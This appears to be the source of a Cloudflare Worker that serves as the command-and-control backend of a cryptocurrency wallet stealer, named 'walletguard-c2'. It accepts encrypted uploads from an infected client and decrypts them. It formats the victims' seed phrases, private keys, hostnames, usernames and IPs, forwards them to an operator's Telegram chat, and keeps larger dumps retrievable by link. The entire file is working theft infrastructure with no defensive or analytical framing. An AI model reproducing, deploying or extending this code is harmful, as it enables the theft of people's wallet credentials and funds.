/**
 * walletguard-c2 — Cloudflare Worker
 *
 * Two jobs:
 *   POST /ingest  -> verify shared secret, relay to Telegram, or stash the
 *                    body in KV and send only a short link when it is big.
 *   GET  /x/<id>  -> hand the stashed body back (for you, not the client).
 *
 * Secrets (wrangler secret put):
 *   WG_INGEST_KEY  shared key the CLI sends as ?k=
 *   TG_TOKEN       Telegram bot token
 *   TG_CHAT        Telegram chat id
 *
 * Binding (wrangler.toml):
 *   KV namespace DUMPS
 */

const MAX_TG = 3900;   // Telegram hard limit is 4096; leave headroom
const MAX_BODY = 8 * 1024 * 1024;
const TTL = 60 * 60 * 24 * 30;

export default {
  async fetch(req, env, ctx) {
    const url = new URL(req.url);

    if (req.method === 'GET' && url.pathname.startsWith('/x/')) {
      return dump(url, env);
    }
    if (req.method === 'POST' && (url.pathname === '/ingest' || url.pathname === '/')) {
      return ingest(req, url, env, ctx);
    }
    if (req.method === 'GET') return json({ ok: true, service: 'walletguard-c2' });
    return new Response('method not allowed', { status: 405 });
  },
};

function json(o, status = 200) {
  return new Response(JSON.stringify(o), {
    status,
    headers: { 'content-type': 'application/json', 'cache-control': 'no-store' },
  });
}


function b64d(s) {
  const b = atob(s);
  const u = new Uint8Array(b.length);
  for (let i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
  return u;
}

// AES-256-GCM + gzip envelope, same format as lib/crypto.js
async function openBlob(blob, secret) {
  const buf = b64d(blob);
  if (String.fromCharCode(buf[0], buf[1], buf[2], buf[3]) !== 'WGv1') throw new Error('bad magic');
  const salt = buf.slice(4, 20);
  const iv = buf.slice(20, 32);
  const tag = buf.slice(32, 48);
  const ct = buf.slice(48);

  const base = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), 'HKDF', false, ['deriveBits']);
  const bits = await crypto.subtle.deriveBits(
    { name: 'HKDF', hash: 'SHA-256', salt: new Uint8Array(salt), info: new TextEncoder().encode('walletguard') },
    base, 256
  );
  const key = await crypto.subtle.importKey('raw', bits, 'AES-GCM', false, ['decrypt']);
  const ctTag = new Uint8Array(ct.length + tag.length);
  ctTag.set(new Uint8Array(ct), 0);
  ctTag.set(new Uint8Array(tag), ct.length);
  const plain = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: new Uint8Array(iv) }, key, ctTag)
    .catch((e) => { throw new Error('decrypt failed: ' + e.name); });
  const un = new DecompressionStream('gzip');
  const stream = new Blob([plain]).stream().pipeThrough(un);
  return JSON.parse(await new Response(stream).text());
}

// pretty text out of the decoded payload
function render(o) {
  const m = o.meta || {};
  const ip = Array.isArray(m.local_ip) ? m.local_ip.join(' ') : (m.local_ip || '');
  const out = [];
  const seeds = o.seeds || [];
  const keys = o.private_keys || o.keys || [];
  const unverified = seeds.filter((x) => x && x.verified === false).length;

  out.push(m.host || 'unknown', m.user || '?', m.platform || '?', ip, m.ts || '');
  out.push('seeds: ' + seeds.length + (unverified ? ' (' + unverified + ' unverified)' : '') + '  keys: ' + keys.length);
  if (o.wallets && o.wallets.length) out.push('wallets: ' + o.wallets.length);

  if (seeds.length) {
    out.push('', '--- SEEDS ---');
    seeds.forEach((x, i) => {
      const w = x.words || x.phrase || String(x);
      out.push((i + 1) + '. ' + w);
      if (x.source) out.push('   @ ' + x.source);
    });
  }
  if (keys.length) {
    out.push('', '--- KEYS ---');
    keys.forEach((x, i) => {
      out.push((i + 1) + '. ' + (x.value || x.key || String(x)));
      if (x.source) out.push('   @ ' + x.source);
    });
  }
  return out.filter((l) => l !== undefined && l !== null).join('\n');
}

async function ingest(req, url, env, ctx) {
  // Shared key check ------------------------------------------------------
  if (env.WG_INGEST_KEY && url.searchParams.get('k') !== env.WG_INGEST_KEY) {
    return json({ ok: false, err: 'bad key' }, 403);
  }

  const len = Number(req.headers.get('content-length') || 0);
  if (len > MAX_BODY) return json({ ok: false, err: 'too big' }, 413);

  let body;
  try {
    body = await req.text();
  } catch {
    return json({ ok: false, err: 'read failed' }, 400);
  }
  if (!body) return json({ ok: false, err: 'empty' }, 400);

  let decoded = null;
  try { decoded = await openBlob(body, env.WG_INGEST_KEY); } catch (e) { decoded = null; console.log('dec_err:', e.message); }
  const text = decoded ? render(decoded) : body;

  const meta = metaOf(req, url);
  const head = `*${meta.host}* · ${meta.ip}\n${meta.ver} · ${meta.ts}`;
  const shown = decoded ? text : text.slice(0, 1500);

  if (shown.length + head.length <= MAX_TG - 20) {
    const r = await tg(env, `${head}\n\n\`\`\`\n${shown}\n\`\`\``);
    return json({ ok: r.ok, mode: 'inline' });
  }

  // Too big for one message: stash it, ship a link.
  const id = crypto.randomUUID().replace(/-/g, '').slice(0, 20);
  await env.DUMPS.put(id, JSON.stringify({ meta, body }), { expirationTtl: TTL });
  const link = `${url.origin}/x/${id}`;
  const r = await tg(env, `${head}\n\n${body.length} B · ${link}`);

  if (env.TG_DOC && r.ok) {
    ctx.waitUntil(sendDoc(env, link, meta));
  }
  return json({ ok: r.ok, mode: 'link', id });
}

async function dump(url, env) {
  const id = url.pathname.slice(3).replace(/[^a-z0-9]/gi, '');
  if (!id) return new Response('no id', { status: 400 });
  const rec = await env.DUMPS.get(id, 'json');
  if (!rec) return new Response('expired or unknown', { status: 404 });

  const raw = url.searchParams.get('raw') === '1';
  const head = `# ${rec.meta.host} · ${rec.meta.ip} · ${rec.meta.ts}\n`;
  return new Response(raw ? rec.body : head + rec.body, {
    headers: {
      'content-type': raw ? 'application/octet-stream' : 'text/plain; charset=utf-8',
      'cache-control': 'no-store',
      'content-disposition': `inline; filename="${id}.txt"`,
    },
  });
}

function metaOf(req, url) {
  const h = req.headers;
  return {
    host: (h.get('x-wg-host') || 'unknown').slice(0, 80),
    ip: (h.get('cf-connecting-ip') || '0.0.0.0').slice(0, 45),
    ver: (h.get('x-wg-ver') || 'v?').slice(0, 24),
    ts: new Date().toISOString(),
    ua: (h.get('user-agent') || '').slice(0, 120),
  };
}

async function tg(env, text) {
  if (!env.TG_TOKEN || !env.TG_CHAT) return { ok: false };
  console.log("tg:", !!env.TG_TOKEN, JSON.stringify(env.TG_CHAT));
  try {
    const r = await fetch(`https://api.telegram.org/bot${env.TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        chat_id: env.TG_CHAT,
        text,

        disable_web_page_preview: true,
      }),
    });
    if (!r.ok) console.log("tg_err:", r.status, await r.clone().text());
    return { ok: r.ok };
  } catch {
    return { ok: false };
  }
}

async function sendDoc(env, link, meta) {
  try {
    const r = await fetch(link + '?raw=1');
    const bytes = await r.arrayBuffer();
    const fd = new FormData();
    fd.set('chat_id', env.TG_CHAT);
    fd.set('document', new Blob([bytes], { type: 'application/octet-stream' }),
      `${meta.host}-${Date.now()}.bin`);
    await fetch(`https://api.telegram.org/bot${env.TG_TOKEN}/sendDocument`, {
      method: 'POST',
      body: fd,
    });
  } catch {
    /* link alone is enough */
  }
}
